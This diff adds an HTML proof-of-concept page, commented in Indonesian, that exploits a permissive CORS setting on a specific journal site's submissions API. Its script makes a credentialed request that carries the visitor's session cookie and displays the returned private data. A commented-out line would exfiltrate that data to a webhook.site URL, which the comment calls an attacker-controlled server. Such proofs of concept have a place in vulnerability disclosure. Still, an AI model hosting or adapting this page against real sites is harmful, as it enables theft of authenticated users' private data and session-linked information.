@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Proof of Concept</title>
+</head>
+<body>
+    <h2>CORS Exploit Demo - Data Theft</h2>
+    <p>Checking sensitive API response...</p>
+    <pre id="output">Loading data from target...</pre>
+
+    <script>
+        // Endpoint API target yang mengembalikan respons dengan access-control-allow-origin: *
+        const targetUrl = "https://healthinformaticsjournal.al-makkipublisher.com/index.php/hij/api/v1/submissions/110";
+
+        fetch(targetUrl, {
+            method: "GET",
+            credentials: "include" // Mengirimkan cookie sesi korban (OJSID) secara otomatis
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error("HTTP error! status: " + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            // Menampilkan data curian ke layar untuk keperluan PoC
+            document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+            
+            // Opsional: Anda juga bisa mengirim data ini ke server penyerang (attacker-controlled server)
+            // fetch("https://webhook.site/e24308e9-2b75-4156-9249-0a1c93754f65/log?data=" + encodeURIComponent(JSON.stringify(data)));
+        })
+        .catch(error => {
+            document.getElementById("output").textContent = "Error: " + error.message;
+        });
+    </script>
+</body>
+</html>
